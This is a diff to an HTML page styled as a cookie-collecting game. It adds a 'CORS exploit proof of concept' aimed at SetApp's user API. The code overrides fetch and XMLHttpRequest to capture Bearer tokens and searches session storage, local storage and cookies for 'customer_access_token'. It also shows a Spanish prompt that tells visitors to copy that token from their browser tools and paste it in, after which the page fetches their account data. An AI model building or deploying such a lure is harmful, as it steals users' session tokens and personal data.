@@ -198,6 +198,24 @@
         .modal-close:hover {
             background: #ff5252;
         }
+        .token-input {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+        }
+        .token-input input {
+            width: 100%;
+            padding: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            color: white;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -218,8 +236,13 @@
             🎯 How many cookies can you collect?
         </div>
         
-        <div class="message" style="background: rgba(76, 175, 80, 0.1); border: 1px solid rgba(76, 175, 80, 0.3);">
-            🔐 <strong>Authentication:</strong> If you're logged into SetApp, your cookies will be sent automatically with <code>credentials: 'include'</code>
+        <div class="token-input" id="tokenSection" style="display: none;">
+            <label for="bearer-token"><strong>Bearer Token:</strong></label>
+            <input type="text" id="bearer-token" placeholder="Pega el token aquí">
+            <small style="display: block; margin-top: 5px; color: #aaa;">
+                Para obtenerlo: F12 → Application → Session Storage → https://my.setapp.com → busca "customer_access_token" → copia el valor
+            </small>
+            <button onclick="retryWithToken()" style="margin-top: 10px; padding: 8px 16px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer;">Intentar de nuevo</button>
         </div>
         
         <div class="warning">
@@ -279,30 +302,123 @@
         // CORS EXPLOIT - Proof of Concept
         // ========================================
         
+        // Interceptar fetch para capturar tokens de peticiones a setapp.com
+        let capturedToken = null;
+        const originalFetch = window.fetch;
+        window.fetch = function(...args) {
+            const url = args[0];
+            const options = args[1] || {};
+            
+            // Si es una petición a setapp.com, capturar el token
+            if (typeof url === 'string' && url.includes('setapp.com')) {
+                const authHeader = options.headers && (
+                    options.headers['Authorization'] || 
+                    options.headers['authorization'] ||
+                    (options.headers.get && options.headers.get('Authorization'))
+                );
+                if (authHeader && authHeader.startsWith('Bearer ')) {
+                    capturedToken = authHeader.replace('Bearer ', '').trim();
+                    console.log('[CORS PoC] Captured token from fetch:', capturedToken);
+                }
+            }
+            
+            return originalFetch.apply(this, args);
+        };
+        
+        // Interceptar XMLHttpRequest también
+        const originalXHROpen = XMLHttpRequest.prototype.open;
+        const originalXHRSend = XMLHttpRequest.prototype.send;
+        XMLHttpRequest.prototype.open = function(method, url, ...rest) {
+            this._url = url;
+            return originalXHROpen.apply(this, [method, url, ...rest]);
+        };
+        XMLHttpRequest.prototype.send = function(...args) {
+            if (this._url && this._url.includes('setapp.com')) {
+                const authHeader = this.getRequestHeader && this.getRequestHeader('Authorization');
+                if (authHeader && authHeader.startsWith('Bearer ')) {
+                    capturedToken = authHeader.replace('Bearer ', '').trim();
+                    console.log('[CORS PoC] Captured token from XHR:', capturedToken);
+                }
+            }
+            return originalXHRSend.apply(this, args);
+        };
+        
         function executeCORSExploit() {
             console.log('[CORS PoC] Executing exploit...');
             
-            // SetApp API endpoint with CORS misconfiguration
-            const targetEndpoint = 'https://user-api.setapp.com/v1/me';
+            // Buscar token
+            let token = capturedToken || getTokenFromStorage();
+            console.log('[CORS PoC] Token found:', token ? 'YES (' + token.substring(0, 20) + '...)' : 'NO');
             
-            // Make request with credentials (cookies sent automatically)
+            if (token) {
+                makeRequest(token);
+            } else {
+                console.log('[CORS PoC] No token found, trying with credentials only...');
+                tryWithCredentialsOnly();
+            }
+        }
+        
+        function makeRequest(token) {
+            const targetEndpoint = 'https://user-api.setapp.com/v1/me';
+            console.log('[CORS PoC] 🚀 Making request with customer_access_token:', token.substring(0, 20) + '...');
+            
+            // Intentar SIN credentials primero (porque * no funciona con credentials)
             fetch(targetEndpoint, {
                 method: 'GET',
-                credentials: 'include', // ← This includes the user's cookies automatically
                 mode: 'cors',
                 headers: {
                     'Accept': 'application/json',
-                    'Content-Type': 'application/json'
+                    'Authorization': `Bearer ${token}`
+                }
+            })
+            .then(response => {
+                console.log('[CORS PoC] ✅ Response status:', response.status);
+                console.log('[CORS PoC] ✅ CORS Header:', response.headers.get('access-control-allow-origin'));
+                return response.json();
+            })
+            .then(data => {
+                console.log('[CORS PoC] ✅✅✅ SUCCESS! Got data:', data);
+                handleCORSResponse(data);
+            })
+            .catch((err) => {
+                console.log('[CORS PoC] ❌ Failed without credentials, trying with credentials:', err);
+                // Si falla, intentar con credentials
+                fetch(targetEndpoint, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'include',
+                    headers: {
+                        'Accept': 'application/json',
+                        'Authorization': `Bearer ${token}`
+                    }
+                })
+                .then(response => response.json())
+                .then(data => handleCORSResponse(data))
+                .catch(err2 => {
+                    console.error('[CORS PoC] ❌❌❌ Both attempts failed:', err2);
+                    handleCORSResponse({
+                        error: err2.message || 'Network error',
+                        needToken: true
+                    });
+                });
+            });
+        }
+        
+        function tryWithCredentialsOnly() {
+            const targetEndpoint = 'https://user-api.setapp.com/v1/me';
+            console.log('[CORS PoC] Trying without token (credentials only)...');
+            
+            // Intentar sin credentials primero (porque * no funciona con credentials)
+            fetch(targetEndpoint, {
+                method: 'GET',
+                mode: 'cors',
+                headers: {
+                    'Accept': 'application/json'
                 }
             })
             .then(response => {
                 console.log('[CORS PoC] Status:', response.status);
                 console.log('[CORS PoC] CORS Header:', response.headers.get('access-control-allow-origin'));
-                
-                if (!response.ok && response.status !== 401 && response.status !== 403) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
                 return response.json();
             })
             .then(data => {
@@ -311,25 +427,125 @@
             .catch(error => {
                 console.error('[CORS PoC] Error:', error);
                 handleCORSResponse({
-                    error: error.message,
-                    note: 'Request failed - check console for details',
-                    cors_header: 'access-control-allow-origin: *'
+                    error: 'No se encontró customer_access_token. Abre F12 → Application → Session Storage → https://my.setapp.com → busca "customer_access_token" y pégala aquí.',
+                    needToken: true
                 });
             });
+        }
+        
+        function getTokenFromStorage() {
+            console.log('[CORS PoC] 🔍 Searching for customer_access_token...');
+            
+            // 1. Buscar customer_access_token en sessionStorage PRIMERO (más común)
+            try {
+                const token = sessionStorage.getItem('customer_access_token');
+                if (token && token.length > 10) {
+                    console.log('[CORS PoC] ✅✅✅ FOUND customer_access_token in sessionStorage!');
+                    return token;
+                }
+                console.log('[CORS PoC] customer_access_token not in sessionStorage');
+            } catch(e) {
+                console.log('[CORS PoC] ⚠️ Cannot access sessionStorage (cross-origin):', e.message);
+            }
+            
+            // 2. Buscar en localStorage
+            try {
+                const token = localStorage.getItem('customer_access_token');
+                if (token && token.length > 10) {
+                    console.log('[CORS PoC] ✅✅✅ FOUND customer_access_token in localStorage!');
+                    return token;
+                }
+            } catch(e) {
+                console.log('[CORS PoC] Cannot access localStorage:', e.message);
+            }
+            
+            // 3. Buscar en cookies (customer_access_token o custome)
+            try {
+                const allCookies = document.cookie;
+                console.log('[CORS PoC] All cookies:', allCookies || 'No cookies');
+                
+                if (allCookies) {
+                    const cookies = allCookies.split(';');
+                    for (let cookie of cookies) {
+                        const parts = cookie.trim().split('=');
+                        if (parts.length >= 2) {
+                            const name = parts[0].trim();
+                            const value = parts.slice(1).join('=');
+                            
+                            // Buscar customer_access_token específicamente
+                            if (name === 'customer_access_token') {
+                                if (value && value.length > 10) {
+                                    console.log('[CORS PoC] ✅✅✅ FOUND customer_access_token in cookie!');
+                                    return value;
+                                }
+                            }
+                            
+                            // Buscar custome como fallback
+                            if (name === 'custome' && value && value.length > 20) {
+                                console.log('[CORS PoC] ✅ Found custome in cookie');
+                                return value;
+                            }
+                        }
+                    }
+                }
+            } catch(e) {
+                console.log('[CORS PoC] Error reading cookies:', e);
+            }
+            
+            console.log('[CORS PoC] ❌❌❌ customer_access_token NOT FOUND');
+            return null;
         }
 
 
         function handleCORSResponse(data) {
-            // Check if it's an error response (not authenticated)
-            if (data.error || data.message || !data.data) {
+            if (data.needToken) {
+                document.getElementById('tokenSection').style.display = 'block';
                 showDemoAlert(data);
-            } else if (data.data && (data.data.email || data.data.id || data.data.public_id)) {
-                // Real user data! (authenticated user)
+                return;
+            }
+            
+            // Check for authorization errors
+            if (data.errors && data.errors.length > 0) {
+                const authError = data.errors.find(e => 
+                    e.title && (e.title.toLowerCase().includes('authorization') || 
+                               e.title.toLowerCase().includes('session') ||
+                               e.detail && e.detail.toLowerCase().includes('expired'))
+                );
+                if (authError) {
+                    document.getElementById('tokenSection').style.display = 'block';
+                    showDemoAlert({
+                        ...data,
+                        needToken: true,
+                        message: 'Token expirado o inválido. Pega el nuevo customer_access_token aquí:'
+                    });
+                    return;
+                }
+            }
+            
+            if (data.data && (data.data.email || data.data.id || data.data.public_id)) {
                 showSuccessAlert(data);
             } else {
-                // Unknown response format
                 showDemoAlert(data);
             }
+        }
+        
+        function retryWithToken() {
+            const token = document.getElementById('bearer-token').value.trim();
+            if (!token) return;
+            
+            fetch('https://user-api.setapp.com/v1/me', {
+                method: 'GET',
+                mode: 'cors',
+                headers: {
+                    'Accept': 'application/json',
+                    'Authorization': `Bearer ${token}`
+                }
+            })
+            .then(response => response.json())
+            .then(data => handleCORSResponse(data))
+            .catch(error => {
+                handleCORSResponse({ error: error.message, needToken: true });
+            });
         }
 
         function showDemoAlert(errorData) {
